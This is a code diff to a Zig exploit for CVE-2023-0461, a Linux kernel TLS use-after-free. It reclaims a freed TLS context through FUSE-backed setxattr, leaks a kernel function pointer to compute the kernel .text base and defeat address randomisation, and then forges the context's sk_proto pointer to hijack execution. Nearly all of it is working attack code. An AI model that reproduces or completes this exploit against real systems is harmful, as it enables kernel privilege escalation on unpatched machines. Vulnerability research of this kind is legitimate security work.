@@ -44,7 +44,7 @@ const TLSCryptoInfo = extern struct {
 
 const AESGCM128 = extern struct {
     info: TLSCryptoInfo,
-    iv: [8]u8,
+    iv: u64 align(1),
     key: [16]u8,
     salt: [4]u8,
     rec_seq: [8]u8,
@@ -210,7 +210,7 @@ fn setTLSOpt(sk: os.socket_t, opt: TLSOpt) !void {
             .version = .TLS13,
             .cipher_type = .AESGCM128,
         },
-        .iv = .{ 'i', 'v' } ** 4,
+        .iv = 0xdeadbeefba115,
         .key = .{ 'k', 'y' } ** 8,
         .salt = .{ 's', 'a', 'l', 't' },
         .rec_seq = .{ 'r', 's' } ** 4,
@@ -271,9 +271,9 @@ const SyncPipe = struct {
 
     pub fn read(self: Self, comptime T: type) !T {
         var out: T = undefined;
-        const buf = mem.asBytes(&out);
+        var buf = mem.asBytes(&out);
 
-        _ = try os.read(self.pipe[0], &buf);
+        _ = try os.read(self.pipe[0], buf);
 
         return out;
     }
@@ -299,7 +299,7 @@ fn cve_2023_0461() !void {
 
     var env = try std.process.getEnvMap(allc);
     defer env.deinit();
-    var fuse_dir = try Fuse.mkTmpDir("fuse-cve-2023-0461", env);
+    var fuse_dir = try Fuse.mkTmpDir("fuse-cve", env);
     defer fuse_dir.close();
     var fuse = try Fuse.init(fuse_dir);
     defer fuse.deinit();
@@ -408,25 +408,26 @@ fn cve_2023_0461() !void {
 
         var req = try fuse.start_read_req();
         var res = Fuse.Response.init(req);
+        var ctx: TLSContext = undefined;
 
-        const push_pending_record = switch (req.body) {
+        switch (req.body) {
             .setxattr => |xattr| blk: {
                 log.info("child: read {s}: {}: {s}", .{
                     xattr.name,
                     xattr.value.len,
                     std.fmt.fmtSliceEscapeLower(xattr.value),
                 });
-                const ctx = mem.bytesAsValue(TLSContext, xattr.value[0..328]);
+                @memcpy(mem.asBytes(&ctx), xattr.value[0..328]);
                 log.info("child: read: {}", .{ctx});
 
-                break :blk ctx.push_pending_record;
+                break :blk;
             },
             else => blk: {
                 log.err("child: read: expected xattr, but got {}", .{req.body});
                 res.err(E.OPNOTSUPP);
-                break :blk 0;
+                break :blk;
             },
-        };
+        }
 
         try res.send(fuse.dev.handle);
         fuse.done_read_req(req);
@@ -434,9 +435,22 @@ fn cve_2023_0461() !void {
         try fuse.do_one(ops); //SETATTR
 
         try psync.cont(3);
+        try psync.write(ctx);
 
-        const kernel_text = push_pending_record - tls_sw_push_pending_record_offset;
-        log.info("child: kernel .text = {x}", .{kernel_text});
+        try fuse.do_one(ops); //GETATTR sb
+
+        log.info("child: wait for parent to allocate xattr value buf", .{});
+        os.nanosleep(1, 0);
+
+        // try os.setsockopt(
+        //     target_sk,
+        //     l.SOL.TLS,
+        //     @intFromEnum(TLSOpt.TX),
+        //     mem.asBytes(&ctx),
+        // );
+
+        const lolwat: u32 = 0x0ddba115;
+        try os.setsockopt(target_sk, SOL.TCP, l.TCP.NOTSENT_LOWAT, mem.asBytes(&lolwat));
 
         try psync.cont(4);
 
@@ -464,17 +478,33 @@ fn cve_2023_0461() !void {
     log.info("parent: free the context", .{});
     os.closeSocket(client_sk);
 
-    const tls_sw_ctx_rx: [512]u8 = .{0x00} ** 512;
+    var ctx_xattr: [512]u8 = .{0x00} ** 512;
 
     log.info("parent: wait for deferred free", .{});
 
     const name: [:0]const u8 = "user.bar";
-    const xattr_path: [:0]const u8 = "/tmp/fuse-cve-2023-0461/foo";
+    const xattr_path: [:0]const u8 = "/tmp/fuse-cve/foo";
 
     os.nanosleep(6, 0);
 
     while (try psync.retry(3)) {
-        const res = Fuse.setxattr(@ptrCast(xattr_path), name, &tls_sw_ctx_rx, tls_sw_ctx_rx.len, 0);
+        const res = Fuse.setxattr(@ptrCast(xattr_path), name, &ctx_xattr, ctx_xattr.len, 0);
+        const err = os.errno(res);
+        log.info("parent: setxattr: {s}: {s}: {}", .{ xattr_path, name, err });
+    }
+
+    var ctx = try psync.read(TLSContext);
+    const kernel_text =
+        ctx.push_pending_record - tls_sw_push_pending_record_offset;
+
+    log.info("child: kernel .text = {x}", .{kernel_text});
+
+    // The salt is 4 bytes and is prepended to the IV
+    ctx.sk_proto = ctx.rx.iv + 4 - 72;
+    @memcpy(ctx_xattr[0..@sizeOf(TLSContext)], mem.asBytes(&ctx));
+
+    {
+        const res = Fuse.setxattr(@ptrCast(xattr_path), name, &ctx_xattr, ctx_xattr.len, 0);
         const err = os.errno(res);
         log.info("parent: setxattr: {s}: {s}: {}", .{ xattr_path, name, err });
     }
